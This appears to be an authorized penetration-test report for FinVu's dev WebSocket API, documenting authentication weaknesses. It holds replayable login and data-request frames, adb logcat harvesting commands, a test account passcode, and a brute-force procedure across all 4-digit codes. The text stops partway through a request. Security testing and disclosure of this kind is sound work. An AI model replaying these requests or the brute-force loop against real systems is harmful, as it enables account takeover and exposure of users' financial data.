# FinVu VAPT — WebSocket API Proof-of-Concept & Field Reference

**Target (dev build):** `com.finvu.development` v2.2.2-dev (debug-signed, libbufkit stripped)
**Backend:** `wss://webvwdev.finvu.in/apiv2`
**Test account (pentester's own dev account):** handle `7666213741@finvu`, passcode `1436`, real deviceId `392368b0-5f1f-4545-ac13-f51e190a672e`
**Authorization:** Authorized VAPT engagement, dev build only. No Frida / no instrumentation — pure black-box WebSocket replay. All session values harvested via `adb logcat` from `FinvuNetworkingManager`.
**Capture date:** 2026-08-07. Verbatim request/response frames below are transcribed from `/tmp/fv_poc2.log` (1462 lines) produced by `finvu_poc.py`.

---

## 0. How to read this document

Part **A** is the field reference — for every WebSocket API field it tells you *what value to put* and *where to harvest it via adb logcat*. Part **B** is the per-finding POCs — numbered steps to reproduce with the verbatim request/response JSON.

---

# PART A — WebSocket Setup & Required Fields

## A.1 Connecting

FinVu runs a single persistent WebSocket. The client is **not** pinned at the TLS layer for the dev backend — a plain `websockets` (Python) or `wscat` client connects and authenticates fine. No client certificate, no signed handshake. Auth is entirely inside the JSON message layer.

```
wss://webvwdev.finvu.in/apiv2
```

The path `/apiv2` is fixed by the backend config (dev: `webvwdev`, prod: `wsslive`). Confirm it in jadx: `FinvuConfig` / `FinvuSdkEnvironment`.

## A.2 The `csid` — connection-session id

Every frame carries a `csid` in the header. It identifies the **WebSocket connection**, not the user.

- **Where it comes from:** the app obtains it from a **REST POST to the endpoint base** (`getCsidFromConsentApi` in `FinvuNetworkingManager`). The response body is `{"csid": "..."}`. It is then attached to every WS frame header.
- **Where to harvest it from logcat:** it appears in literally every WS frame. Grab it from the first message after the app opens the socket:

```bash
adb logcat FinvuNetworkingManager:D *:S | grep -o '"csid":"[^"]*"' | head -1
# e.g. -> "csid":"01KZBC4MAY1D0PTT7T7P63M7CV"
```

- **Can you reuse a csid across connections?** Yes — the csid used in this POC (`01KZBC4MAY1D0PTT7T7P63M7CV`) was harvested once and reused for all logins across the whole run. It is connection-scoped, not user-scoped.

## A.3 Frame structure

Every message is `{"header": {...}, "payload": {...}}`. The `header.type` is a URN that names the API:

```
request : urn:finvu:in:app:req.<api>.01
response: urn:finvu:in:app:res.<api>.01
```

Responses are **asynchronous and correlated by `mid`** (not by order). Match a response to its request by `header.mid`.

## A.4 Harvesting values via adb logcat — the one command

`FinvuNetworkingManager` logs the full JSON of every sent/received frame under `WebSocket message sent:` / `WebSocket message received:`. Capture everything:

```bash
adb connect 192.168.126.103:5555
adb logcat FinvuNetworkingManager:D *:S >> finvu.log
```

Then exercise the feature in the app (login, open consents, etc.) and pull the values out of `finvu.log` with the grep patterns in the table below.

### Useful grep patterns

| Value you want | grep pattern | Which frame to look at |
|---|---|---|
| `csid` | `grep -o '"csid":"[^"]*"' \| head -1` | any frame |
| `sid` (your session) | `grep -o '"sid":"[^"]*"' \| tail -1` | `res.login.01` |
| login payload (username/pw/deviceId/secret) | `grep -A20 'req.login.01'` | `req.login.01` |
| consentId list | `grep -o '"consentId":"[^"]*"'` | `res.getUserConsent.01` |
| consentIntentId | `grep -o '"consentIntentId":"[^"]*"'` | `res.getUserConsent.01` |
| accRefNumber / linkRefNumber / maskedAccNumber | `grep -o '"accRefNumber":"[^"]*"'` etc. | `res.userLinkedAccount.01` |
| fipId / fipName | `grep -o '"fipId":"[^"]*"'` | `res.userLinkedAccount.01` |
| AA id | `grep -o '"id":"cookiejar-aa@finvu.in"'` | `res.getConsentDetails.01` → `AA.id` |
| KeyMaterial (KeyValue/Nonce) sent for a fetch | `grep -A30 'req.accountDataRequest.01'` | `req.accountDataRequest.01` |

## A.5 Field-by-field reference

### Header fields (every request)

| Field | What to put | Where to harvest |
|---|---|---|
| `mid` | Self-generated UUIDv4. **Must be unique per request** — it's the correlation key. | Generate: `uuid.uuid4()` / `uuidgen` |
| `ts` | ISO-8601 with ms + offset: `yyyy-MM-dd'T'HH:mm:ss.SSSXXX`, e.g. `2026-08-07T12:08:15.048+05:30`. | Generate from current time. Backend accepts any sane TZ offset. |
| `sid` | Per-user session id. `null` for `req.login.01`. **Set to the `sid` from `res.login.01` for every authenticated API.** | `res.login.01` header. |
| `dup` | `false` always (duplicate-suppression flag). | literal |
| `type` | `urn:finvu:in:app:req.<api>.01` for the API you are calling. | literal |
| `csid` | Connection-session id (see A.2). | logcat, first frame's `"csid":"..."` |

### `req.login.01` payload

| Field | What to put | Where to harvest |
|---|---|---|
| `username` | Mobile number + `@finvu`, e.g. `7666213741@finvu`. | logcat `req.login.01` |
| `password` | The 4-digit passcode (e.g. `1436`). **This is the sole auth gate** (see Finding 1). | logcat `req.login.01` |
| `deviceSecret.deviceId` | UUID of a registered device. **Not enforced** — a fabricated string still succeeds (see POC-1 Step 2). | logcat `req.login.01`; or just fabricate any UUID-like string |
| `deviceSecret.secret` | 6-digit TOTP. **Not validated** — `000000` succeeds (see POC-1 Step 1). | logcat `req.login.01`; or just send `000000` |

### `userId` (used by ~all post-login APIs)

After login, most APIs take `{"userId": "<handle>"}`. `userId` == the login `username` == `<mobile>@finvu`. Harvest from any `req.*` frame's payload after login.

### `req.getUserConsent.01` → `res.getUserConsent.01`

Input: `{"userId": ...}`. Response `payload.userConsents[]` each carry `consentIntentId`, `consentIntentEntityId`/`Name` (the FIU), `consentIdList[]`, `consentPurposeText`, status, FIP, masked accounts, `DataDateTimeRange`, `Frequency`, `DataLife`.

- **consentId** (the thing you actually fetch data against): `res.getUserConsent.01` → `userConsents[].consentIdList[]` — OR `res.userLinkedAccount.01` → `LinkedAccounts[].consentIdList[]`.
- **consentIntentId**: `res.getUserConsent.01` → `userConsents[].consentIntentId`.

> ⚠️ `getConsentDetails` accepts **either** a consentId **or** an intentId (both return SUCCESS — see POC BL-8). But `accountDataRequest` requires the **consentId**; passing the intentId gives `"Invalid consent details."`.

### `req.userLinkedAccount.01` → `res.userLinkedAccount.01`

Input: `{"userId": ...}`. Response `payload.LinkedAccounts[]` each carry:

| Field | Use | Harvest |
|---|---|---|
| `fipId` / `fipName` | Financial Information Provider id/name, e.g. `BARB0KIMXXX` / `Finvu Bank`. Needed for `consent-revoke` `fipDetails`. | `res.userLinkedAccount.01` |
| `accRefNumber` | Account reference, e.g. `FIN495956415`. | same |
| `linkRefNumber` | Link reference UUID, e.g. `97e5b766-...`. Used by account-linking APIs; also appears in `getConsentDetails` `Accounts[].linkRefNumber`. | same |
| `maskedAccNumber` | `XXXXX6415` etc. | same |
| `consentIdList` | Consents attached to this linked account. | same |
| `FIType` / `accType` | e.g. `DEPOSIT`/`SAVINGS`. | same |

### `req.consent-revoke.01` payload

| Field | What to put | Where to harvest |
|---|---|---|
| `userId` | handle | login |
| `consentId` | consent to revoke | `res.getUserConsent.01` |
| `revokeType` | `"REVOKED"` | literal |
| `accountAggregator.id` | AA id, e.g. `cookiejar-aa@finvu.in` | `res.getConsentDetails.01` → `AA.id` |
| `fipDetails.fipId` / `fipName` | FIP | `res.userLinkedAccount.01` |

### `req.chpassword.01` payload

Field names are `oldPassword` / `newPassword` / `rePassword` (NOT `currentPassword`/`confirmPassword`). `username` is the handle. The backend **does** verify `oldPassword` (see POC BL-6).

### `req.accountDataRequest.01` payload (the data-fetch API)

Outer fields are **Capitalized** (jadx `AccountDataRequest.java`):

| Field | What to put | Where to harvest / how to generate |
|---|---|---|
| `ver` | `"2.0.0"` | literal |
| `timestamp` | ISO `yyyy-MM-dd'T'HH:mm:ss.SSSXXX` | generate |
| `txnid` | UUIDv4 | generate |
| `FIDataRange.from` | **epoch-millis long** (not ISO string!) — start of the data window. | derive from consent's `DataDateTimeRange.from` |
| `FIDataRange.to` | **epoch-millis long** — end of data window. | derive from consent's `DataDateTimeRange.to` |
| `Consent.id` | the **consentId** (not intentId) | `res.getUserConsent.01` |
| `Consent.digitalSignature` | consent signature; `""` for unsigned dev consents | `res.getConsentDetails.01` → `Signature` |
| `KeyMaterial.cryptoAlg` | `"ECDH"` | literal |
| `KeyMaterial.curve` | `"Curve25519"` | literal |
| `KeyMaterial.params` | `""` | literal |
| `KeyMaterial.DHPublicKey.expiry` | ISO ts (future) | generate |
| `KeyMaterial.DHPublicKey.KeyValue` | PEM (SPKI) of an X25519 public key, e.g. `MCowBQYDK2VuAyEA...` | generate: X25519 keypair → SPKI DER → base64 |
| `KeyMaterial.DHPublicKey.Parameters` | `""` | literal |
| `KeyMaterial.Nonce` | base64 of 32 random bytes | generate: `os.urandom(32)` → base64 |

Decryption of the returned FI (when the fetch succeeds): ECDH(yourPriv, remotePub) → HKDF-SHA256 → AES-256-GCM, 12-byte IV, `xor(ourNonce, remoteNonce)` for the nonce derivation (see jadx `CryptoUtils.java`).

> **Why the POC data-fetch returns `Invalid key` and not actual data:** the dev consents are **unsigned** (`Signature: null`). `accountDataRequest` validates the consent's digital signature **before** fetching — an unsigned/invalid signature fails at "Invalid key". This is a **consent-signature validation error, not an auth/session rejection** — which is exactly what proves the bypass session reached the data-fetch authorization layer (see POC BL-1). With a signed active consent the same bypassed-auth session would decrypt financial data.

---

# PART B — Proof-of-Concepts (verbatim request/response)

All frames below were sent over a single WebSocket using the harvested `csid 01KZBC4MAY1D0PTT7T7P63M7CV`. `mid`/`txnid` are freshly generated UUIDs per request.

---

## POC-1 — Finding 1 (CRITICAL): Authentication bypass — deviceSecret + deviceId + sim-binding not enforced

**Vulnerability:** `req.login.01` grants a valid session (`status: SUCCESS` + `sid`) when `deviceSecret.secret` (TOTP) is bogus, `deviceId` is fabricated, and `deviceSimBindingValid` is `false`. The 4-digit password is the **only** factor checked.

### Step 1 — REAL deviceId + BOGUS deviceSecret `000000` → SUCCESS

**Request** `urn:finvu:in:app:req.login.01`
```json
{
  "header": {
    "mid": "390d81de-d050-4ad0-a4bf-a783edd57896",
    "ts": "2026-08-07T12:08:15.048+05:30",
    "dup": false,
    "type": "urn:finvu:in:app:req.login.01",
    "csid": "01KZBC4MAY1D0PTT7T7P63M7CV"
  },
  "payload": {
    "username": "7666213741@finvu",
    "password": "1436",
    "deviceSecret": {
      "deviceId": "392368b0-5f1f-4545-ac13-f51e190a672e",
      "secret": "000000"
    }
  }
}
```

**Response** `urn:finvu:in:app:res.login.01`
```json
{
  "header": {
    "mid": "390d81de-d050-4ad0-a4bf-a783edd57896",
    "ts": "2026-08-07T06:38:15.082+00:00",
    "sid": "01KZDF3714BFN5CA8HZBB1XX2C",
    "dup": false,
    "type": "urn:finvu:in:app:res.login.01",
    "csid": "01KZBC4MAY1D0PTT7T7P63M7CV"
  },
  "payload": {
    "status": "SUCCESS",
    "message": "Welcome!",
    "code": null,
    "deviceSimBindingValid": false
  }
}
```

> **Result:** `SUCCESS`, sid `01KZDF3714BFN5CA8HZBB1XX2C`, `deviceSimBindingValid: false`. The TOTP `000000` was never checked. This sid is then used to reach every post-login API in POC-1b.

### Steps to reproduce (Step 1)
1. Connect to `wss://webvwdev.finvu.in/apiv2`.
2. Harvest `csid` from any app WS frame in logcat.
3. Send `req.login.01` with `deviceSecret.secret = "000000"` and the known `password`.
4. Observe `status: SUCCESS` + a `sid` — the bypass session is established.

### Step 2 — FABRICATED deviceId + bogus secret → SUCCESS

**Request** `urn:finvu:in:app:req.login.01`
```json
{
  "header": {
    "mid": "1ffd5369-f5c3-463c-a091-90f6d344aa6b",
    "ts": "2026-08-07T12:08:32.990+05:30",
    "dup": false,
    "type": "urn:finvu:in:app:req.login.01",
    "csid": "01KZBC4MAY1D0PTT7T7P63M7CV"
  },
  "payload": {
    "username": "7666213741@finvu",
    "password": "1436",
    "deviceSecret": {
      "deviceId": "deadbeef-device",
      "secret": "000000"
    }
  }
}
```

**Response** `urn:finvu:in:app:res.login.01`
```json
{
  "header": {
    "mid": "1ffd5369-f5c3-463c-a091-90f6d344aa6b",
    "ts": "2026-08-07T06:38:33.024+00:00",
    "sid": "01KZDF3RHTPMSS6GZ2Y39QC3WC",
    "dup": false,
    "type": "urn:finvu:in:app:res.login.01",
    "csid": "01KZBC4MAY1D0PTT7T7P63M7CV"
  },
  "payload": {
    "status": "SUCCESS",
    "message": "Welcome!",
    "code": null,
    "deviceSimBindingValid": false
  }
}
```

> **Result:** A completely fabricated `deviceId "deadbeef-device"` still yields `SUCCESS` and a fresh sid. `deviceId` is **not** checked against any registered-device list.

### Step 3 (control) — WRONG passcode → FAILURE (proves the password IS the gate)

**Request** `urn:finvu:in:app:req.login.01`
```json
{
  "header": {
    "mid": "b943b5e9-a04d-4a4d-b8d3-c30b53c6e5f1",
    "ts": "2026-08-07T12:08:37.140+05:30",
    "dup": false,
    "type": "urn:finvu:in:app:req.login.01",
    "csid": "01KZBC4MAY1D0PTT7T7P63M7CV"
  },
  "payload": {
    "username": "7666213741@finvu",
    "password": "WRONGPASS",
    "deviceSecret": {
      "deviceId": "392368b0-5f1f-4545-ac13-f51e190a672e",
      "secret": "000000"
    }
  }
}
```

**Response** `urn:finvu:in:app:res.login.01`
```json
{
  "header": {
    "mid": "b943b5e9-a04d-4a4d-b8d3-c30b53c6e5f1",
    "ts": "2026-08-07T06:38:37.167+00:00",
    "sid": null,
    "dup": false,
    "type": "urn:finvu:in:app:res.login.01",
    "csid": "01KZBC4MAY1D0PTT7T7P63M7CV"
  },
  "payload": {
    "status": "FAILURE",
    "message": "Invalid username or password.",
    "code": null,
    "deviceSimBindingValid": false
  }
}
```

> **Result:** Wrong password → `FAILURE`, `sid: null`. Combined with Steps 1–2 this proves the password is the **only** enforced factor: device factors are decorative.

---

## POC-1b — Findings 1 & 3: full data access + metadata disclosure with the bypass sid

All of the following use the bypass sid `01KZDF3714BFN5CA8HZBB1XX2C` from POC-1 Step 1 (the one with bogus TOTP and `deviceSimBindingValid: false`).

### Step 1 — userInfo → ACCEPT

**Request** `urn:finvu:in:app:req.userInfo.01`
```json
{
  "header": {
    "mid": "3417e63c-1c1e-4b40-99e6-c1d8cdf06b38",
    "ts": "2026-08-07T12:08:20.130+05:30",
    "dup": false,
    "type": "urn:finvu:in:app:req.userInfo.01",
    "sid": "01KZDF3714BFN5CA8HZBB1XX2C",
    "csid": "01KZBC4MAY1D0PTT7T7P63M7CV"
  },
  "payload": {
    "userId": "7666213741@finvu"
  }
}
```

**Response** `urn:finvu:in:app:res.userInfo.01`
```json
{
  "header": {
    "mid": "3417e63c-1c1e-4b40-99e6-c1d8cdf06b38",
    "ts": "2026-08-07T06:38:20.159+00:00",
    "sid": "01KZDF3714BFN5CA8HZBB1XX2C",
    "dup": false,
    "type": "urn:finvu:in:app:res.userInfo.01",
    "csid": "01KZBC4MAY1D0PTT7T7P63M7CV"
  },
  "payload": {
    "status": "ACCEPT",
    "message": "Received UserInfo Successfully",
    "code": null,
    "UserInfo": {
      "userId": "7666213741@finvu",
      "mobileNo": "7666213741",
      "mobileAuthenticated": "Y",
      "emailId": "",
      "emailAuthenticated": "N",
      "panProvided": "N",
      "dobProvided": "N"
    }
  }
}
```

### Step 2 — userLinkedAccount → SUCCESS, 3 linked accounts (masked PANs/acc numbers disclosed)

**Request** `urn:finvu:in:app:req.userLinkedAccount.01`
```json
{
  "header": {
    "mid": "10dc477d-f126-49a6-8706-f33d770dbe2d",
    "ts": "2026-08-07T12:08:20.201+05:30",
    "dup": false,
    "type": "urn:finvu:in:app:req.userLinkedAccount.01",
    "sid": "01KZDF3714BFN5CA8HZBB1XX2C",
    "csid": "01KZBC4MAY1D0PTT7T7P63M7CV"
  },
  "payload": {
    "userId": "7666213741@finvu"
  }
}
```

**Response** `urn:finvu:in:app:res.userLinkedAccount.01` (3 accounts; trimmed for readability — full list in `/tmp/fv_poc2.log` lines 109–185)
```json
{
  "header": {
    "mid": "10dc477d-f126-49a6-8706-f33d770dbe2d",
    "ts": "2026-08-07T06:38:20.233+00:00",
    "sid": "01KZDF3714BFN5CA8HZBB1XX2C",
    "dup": false,
    "type": "urn:finvu:in:app:res.userLinkedAccount.01",
    "csid": "01KZBC4MAY1D0PTT7T7P63M7CV"
  },
  "payload": {
    "status": "SUCCESS",
    "message": null,
    "code": "F200",
    "LinkedAccounts": [
      {
        "userId": "7666213741@finvu",
        "fipId": "BARB0KIMXXX",
        "fipName": "Finvu Bank",
        "maskedAccNumber": "XXXXX6415",
        "accRefNumber": "FIN495956415",
        "linkRefNumber": "07e553e6-0bb4-4701-805e-cb39eb8bb790",
        "identifiers": "7666213741",
        "consentIdList": ["e747b733-...", "52bf1c6b-...", "3e4e679c-...", "9899cf89-..."],
        "FIType": "RECURRING_DEPOSIT",
        "accType": "DEFAULT"
      },
      {
        "userId": "7666213741@finvu",
        "fipId": "BARB0KIMXXX",
        "fipName": "Finvu Bank",
        "maskedAccNumber": "XXXXX6727",
        "accRefNumber": "FIN037206727",
        "linkRefNumber": "97e5b766-2121-44e6-b096-c2566246c5bf",
        "identifiers": "7666213741",
        "consentIdList": ["61a2aca5-...", "cb49be12-...", "4b402bd9-a0e1-4c06-b0de-a04852fbefc9", "2c58cbe4-..."],
        "FIType": "DEPOSIT",
        "accType": "SAVINGS"
      },
      {
        "userId": "7666213741@finvu",
        "fipId": "BARB0KIMXXX",
        "fipName": "Finvu Bank",
        "maskedAccNumber": "XXXXX1161",
        "accRefNumber": "FIN736201161",
        "linkRefNumber": "a81ba03e-c1e7-42f8-95b1-6cef9c00276d",
        "identifiers": "7666213741",
        "consentIdList": ["b110f14c-...", "d7edfedc-...", "b86a9703-..."],
        "FIType": "DEPOSIT",
        "accType": "SAVINGS"
      }
    ]
  }
}
```

> **Result (Finding 3 — metadata disclosure):** the unbound (sim-binding=false, bogus-TOTP) session enumerates all linked accounts — masked account numbers, accRefNumbers, linkRefNumbers, FI types, and the consentIds attached to each account.

### Step 3 — getUserConsent → SUCCESS (24 consents)

**Request** `urn:finvu:in:app:req.getUserConsent.01`
```json
{
  "header": {
    "mid": "8ac2b3b3-7cf0-4b3c-be10-ea983c5a0054",
    "ts": "2026-08-07T12:08:20.275+05:30",
    "dup": false,
    "type": "urn:finvu:in:app:req.getUserConsent.01",
    "sid": "01KZDF3714BFN5CA8HZBB1XX2C",
    "csid": "01KZBC4MAY1D0PTT7T7P63M7CV"
  },
  "payload": {
    "userId": "7666213741@finvu"
  }
}
```

**Response** (header + first consent only — full 24-consent body is 280+ lines, in `/tmp/fv_poc2.log` lines 204–489)
```json
{
  "header": {
    "mid": "8ac2b3b3-7cf0-4b3c-be10-ea983c5a0054",
    "ts": "2026-08-07T06:38:20.306+00:00",
    "sid": "01KZDF3714BFN5CA8HZBB1XX2C",
    "dup": false,
    "type": "urn:finvu:in:app:res.getUserConsent.01",
    "csid": "01KZBC4MAY1D0PTT7T7P63M7CV"
  },
  "payload": {
    "status": "SUCCESS",
    "message": null,
    "code": "F200",
    "userConsents": [
      {
        "consentIntentId": "0193c400-ada9-4d42-91b5-7030acb3425e",
        "consentIntentEntityId": "fiu@dhanaprayoga",
        "consentIntentEntityName": "Dhanaprayoga NBFC",
        "consentIdList": ["b22ce5c1-2f75-4a19-83bb-165ab4a91268"],
        "consentIntentUpdateTimestamp": "2025-07-04T09:33:37.017+00:00",
        "consentPurposeText": "Explicit consent for monitoring of the accounts"
      }
      /* ...23 more consent intents, mix of ACTIVE / REVOKED ... */
    ]
  }
}
```

> **Result (Finding 3):** full consent history disclosed — every FIU the user ever shared data with (`fiu@dhanaprayoga`, `fiu@jainambroking`, Finvu FIU Simulator, etc.), every consentIntentId/consentId, purpose text, statuses, date ranges. This is a rich disclosure surface reachable from a session that passed no second factor.

### Step 4 — userConsentReport → SUCCESS (Base64-encoded CSV)

**Request** `urn:finvu:in:app:req.userConsentReport.01`
```json
{
  "header": {
    "mid": "a06e9d15-38a4-46f5-9171-867dbc805c5c",
    "ts": "2026-08-07T12:08:20.461+05:30",
    "dup": false,
    "type": "urn:finvu:in:app:req.userConsentReport.01",
    "sid": "01KZDF3714BFN5CA8HZBB1XX2C",
    "csid": "01KZBC4MAY1D0PTT7T7P63M7CV"
  },
  "payload": {
    "userId": "7666213741@finvu"
  }
}
```

**Response** — `payload.message` is Base64 of a CSV. Decoded header + summary rows:
```
ConsentId,Status,CreatedOn,StatusUpdatedOn,StartDate,ExpiryDate,Mode,FetchType,ConsentTypes,FiTypes,DataConsumer,Accounts,Purpose,FiDataRange,DataLife,Frequency,DataFilter,Usage
b22ce5c1-2f75-4a19-83bb-165ab4a91268,REVOKED,Fri May 02 12:35:33 GMT 2025,...
4b402bd9-a0e1-4c06-b0de-a04852fbefc9,ACTIVE,Tue May 26 07:17:03 GMT 2026,...
...
Total Consents:,27
Total Active Consents:,11
Total Expired Consents:,0
Total Paused Consents:,0
Total Revoked Consents:,16
```

> **Result (Finding 3):** a downloadable audit-grade consent report (27 consents, 11 active, 16 revoked) is returned to the bypass session. The full Base64 blob is at `/tmp/fv_poc2.log` lines 507–521.

### Steps to reproduce (POC-1b)
1. Establish the bypass sid (POC-1 Step 1).
2. Send `req.userInfo`/`req.userLinkedAccount`/`req.getUserConsent`/`req.userConsentReport` with `{"userId": "<handle>"}` and the bypass `sid`.
3. All return `SUCCESS`/`ACCEPT` — full account + consent metadata disclosed with no second factor ever validated.

---

## POC-2 — Finding 2 (HIGH): 4-digit passcode, no brute-force lockout

**Vulnerability:** 5 consecutive wrong-password login attempts return the identical `FAILURE` with no lockout, delay, CAPTCHA, or rate-limit. The handle (`<mobile>@finvu`) is semi-public (the mobile number). The passcode is 4 numeric digits → 10 000 combinations. No lockout means the passcode is brute-forceable → account takeover with only the victim's mobile number.

**Request** (attempt 5 of 5, identical structure for all 5; only `mid`/`ts` change)
```json
{
  "header": {
    "mid": "51c955ac-af80-4cb5-877c-c352d6b5d4ea",
    "ts": "2026-08-07T12:08:49.502+05:30",
    "dup": false,
    "type": "urn:finvu:in:app:req.login.01",
    "csid": "01KZBC4MAY1D0PTT7T7P63M7CV"
  },
  "payload": {
    "username": "7666213741@finvu",
    "password": "0000WRONG",
    "deviceSecret": {
      "deviceId": "392368b0-5f1f-4545-ac13-f51e190a672e",
      "secret": "000000"
    }
  }
}
```

**Response** (attempt 5 — same as attempts 1–4)
```json
{
  "header": {
    "mid": "51c955ac-af80-4cb5-877c-c352d6b5d4ea",
    "ts": "2026-08-07T06:38:49.528+00:00",
    "sid": null,
    "dup": false,
    "type": "urn:finvu:in:app:res.login.01",
    "csid": "01KZBC4MAY1D0PTT7T7P63M7CV"
  },
  "payload": {
    "status": "FAILURE",
    "message": "Invalid username or password.",
    "code": null,
    "deviceSimBindingValid": false
  }
}
```

> **Result:** After 5 wrong attempts (spaced 3 s apart) the response is byte-identical to attempt 1 — no `locked`/`throttled`/`retry-after`, no escalating delay, no CAPTCHA. The only `RETRY` ever observed was the unrelated one-session-per-user lock (a *successful* login is already active), not a lockout.

### Steps to reproduce
1. Loop: send `req.login.01` with the known handle and an incrementing/wrong `password`, fixed bogus `deviceSecret`.
2. Observe identical `FAILURE "Invalid username or password."` on every attempt with no backoff or lockout.
3. Extend the loop to enumerate `0000`–`9999` (10 000 attempts) — at the observed rate this completes in well under an hour and yields a `SUCCESS` sid → full account takeover using only the victim's mobile number.

---

## POC-4 — Finding 4 (LOW): one-session-per-user → forced logout / session DoS + activity oracle

**Vulnerability:** A new successful login for a user invalidates the previous `sid`. An attacker who can login (which, per Finding 1, needs only the password) can repeatedly force the legitimate user's session to `Session Error. (F402)`. The login flow also leaks an "already logged in" `RETRY` that acts as a live-session activity oracle.

### Step 1 — userInfo with sidA (works)
```json
{
  "header": {
    "mid": "ce9eac04-eb10-48c1-9d41-45edc41995cd",
    "ts": "2026-08-07T12:08:21.562+05:30",
    "dup": false,
    "type": "urn:finvu:in:app:req.userInfo.01",
    "sid": "01KZDF3714BFN5CA8HZBB1XX2C",
    "csid": "01KZBC4MAY1D0PTT7T7P63M7CV"
  },
  "payload": { "userId": "7666213741@finvu" }
}
```
→ `status: ACCEPT` (sidA is alive).

### Step 2 — SECOND successful login → sidB (invalidates sidA)
**Request** `urn:finvu:in:app:req.login.01 (second login)`
```json
{
  "header": {
    "mid": "541d4da1-12c5-40a3-b096-223aaa9bb4c8",
    "ts": "2026-08-07T12:08:25.702+05:30",
    "dup": false,
    "type": "urn:finvu:in:app:req.login.01",
    "csid": "01KZBC4MAY1D0PTT7T7P63M7CV"
  },
  "payload": {
    "username": "7666213741@finvu",
    "password": "1436",
    "deviceSecret": {
      "deviceId": "392368b0-5f1f-4545-ac13-f51e190a672e",
      "secret": "000000"
    }
  }
}
```
**Response**
```json
{
  "header": {
    "mid": "541d4da1-12c5-40a3-b096-223aaa9bb4c8",
    "ts": "2026-08-07T06:38:25.734+00:00",
    "sid": "01KZDF3HE1NA00EBWQ33EE77TC",
    "dup": false,
    "type": "urn:finvu:in:app:res.login.01",
    "csid": "01KZBC4MAY1D0PTT7T7P63M7CV"
  },
  "payload": {
    "status": "SUCCESS",
    "message": "Welcome!",
    "code": null,
    "deviceSimBindingValid": false
  }
}
```

### Step 3 — reuse the OLD sidA → Session Error (F402)
**Request** `urn:finvu:in:app:req.userInfo.01` (sid forced back to sidA)
```json
{
  "header": {
    "mid": "047ceb98-6f1e-4daa-bbac-85cd57d3391a",
    "ts": "2026-08-07T12:08:25.785+05:30",
    "dup": false,
    "type": "urn:finvu:in:app:req.userInfo.01",
    "sid": "01KZDF3714BFN5CA8HZBB1XX2C",
    "csid": "01KZBC4MAY1D0PTT7T7P63M7CV"
  },
  "payload": { "userId": "7666213741@finvu" }
}
```
**Response** — note the `type` is `res.logout.01` (server treats stale-sid as a logout)
```json
{
  "header": {
    "mid": "047ceb98-6f1e-4daa-bbac-85cd57d3391a",
    "ts": "2026-08-07T06:38:25.809+00:00",
    "sid": "01KZDF3714BFN5CA8HZBB1XX2C",
    "dup": false,
    "type": "urn:finvu:in:app:res.logout.01",
    "csid": "01KZBC4MAY1D0PTT7T7P63M7CV"
  },
  "payload": {
    "status": "FAILURE",
    "message": "Session Error.",
    "code": "F402"
  }
}
```

> **Result:** sidA is dead the instant sidB was issued. A logged-in attacker can therefore (a) DoS the victim's active session by logging in themselves, and (b) the `RETRY "already logged in"` response on a second concurrent login reveals whether a session is currently active — a weak activity oracle.

### Steps to reproduce
1. Login as the victim → sidA. Confirm `userInfo` works.
2. Login again as the victim (same password) → sidB.
3. Re-send any authenticated API with sidA → `Session Error. (F402)`.

---

## POC BL-1 — Corroborates Finding 1: bypass session reaches the accountDataRequest data-fetch authorization layer

**What this proves:** the bypassed-auth session (bogus TOTP, sim-binding=false) is **accepted by the data-fetch API's authorization layer**. The responses are consent/key validation errors — *not* auth/session rejections. With a signed active consent, this same session would decrypt financial data.

**KeyMaterial used** (generated X25519 SPKI key + zero nonce; unsigned dev consent so signature is `""`):
```json
"KeyMaterial": {
  "cryptoAlg": "ECDH",
  "curve": "Curve25519",
  "params": "",
  "DHPublicKey": {
    "expiry": "2026-08-07T12:08:20.794+05:30",
    "KeyValue": "MCowBQYDK2VuAyEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=",
    "Parameters": ""
  },
  "Nonce": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="
}
```

### Step 1 — ACTIVE consentId → "Invalid key" (consent-signature validation, NOT auth reject)

**Request** `urn:finvu:in:app:req.accountDataRequest.01`
```json
{
  "header": {
    "mid": "9fa9d4a3-1eba-4494-b876-bee45d205aff",
    "ts": "2026-08-07T12:08:20.794+05:30",
    "dup": false,
    "type": "urn:finvu:in:app:req.accountDataRequest.01",
    "sid": "01KZDF3714BFN5CA8HZBB1XX2C",
    "csid": "01KZBC4MAY1D0PTT7T7P63M7CV"
  },
  "payload": {
    "ver": "2.0.0",
    "timestamp": "2026-08-07T12:08:20.794+05:30",
    "txnid": "60dfc356-4abd-4c8a-beb3-289b92758503",
    "FIDataRange": { "from": 1748248023000, "to": 1748249000000 },
    "Consent": { "id": "4b402bd9-a0e1-4c06-b0de-a04852fbefc9", "digitalSignature": "" },
    "KeyMaterial": { "cryptoAlg": "ECDH", "curve": "Curve25519", "params": "",
      "DHPublicKey": { "expiry": "2026-08-07T12:08:20.794+05:30",
        "KeyValue": "MCowBQYDK2VuAyEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=", "Parameters": "" },
      "Nonce": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=" }
  }
}
```

**Response**
```json
{
  "header": {
    "mid": "9fa9d4a3-1eba-4494-b876-bee45d205aff",
    "ts": "2026-08-07T06:38:21.215+00:00",
    "sid": "01KZDF3714BFN5CA8HZBB1XX2C",
    "dup": false,
    "type": "urn:finvu:in:app:res.accountDataRequest.01",
    "csid": "01KZBC4MAY1D0PTT7T7P63M7CV"
  },
  "payload": {
    "status": "FAILURE",
    "message": "Invalid key.",
    "code": null,
    "ver": null, "timestamp": null, "txnid": null,
    "consentId": null, "sessionId": null
  }
}
```

> **Interpretation:** `"Invalid key."` is the consent-signature/key validation failing because the dev consent is unsigned (`Signature: null`). The request was **authenticated and authorized** — the sid was accepted — and reached the consent-validation stage. It is **not** `"Session Error." (F402)` and **not** `"Invalid username or password."`.

### Step 2 — intentId (instead of consentId) → "Invalid consent details." (ID-resolution guard)

**Request** (same as Step 1 but `Consent.id` = the intentId `42f12d7e-141f-4d82-87b7-9715c3cc62dc`)
```json
{
  "header": {
    "mid": "98ac994c-12c4-4b32-8c5b-0933bc6455a8",
    "ts": "2026-08-07T12:08:21.259+05:30",
    "dup": false,
    "type": "urn:finvu:in:app:req.accountDataRequest.01",
    "sid": "01KZDF3714BFN5CA8HZBB1XX2C",
    "csid": "01KZBC4MAY1D0PTT7T7P63M7CV"
  },
  "payload": {
    "ver": "2.0.0",
    "timestamp": "2026-08-07T12:08:21.259+05:30",
